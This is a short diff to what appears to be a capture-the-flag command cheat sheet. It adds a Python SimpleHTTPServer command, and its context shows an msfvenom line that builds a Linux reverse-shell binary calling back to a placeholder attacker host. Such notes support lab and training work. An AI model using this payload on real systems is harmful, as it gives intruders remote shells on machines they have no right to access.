@@ -118,6 +118,22 @@ A collection of tool commands and scripts for capture the flag machines
   msfvenom -p linux/x86/shell_reverse_tcp LHOST=[LHOST_IP] LPORT=[LHOST_PORT] -f elf -o rev
   ```
   
+  # Start SimpleHTTPServer with Python
+  
+  ```python
+  python -m SimpleHTTPServer 80
+  ```
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
   
   
   
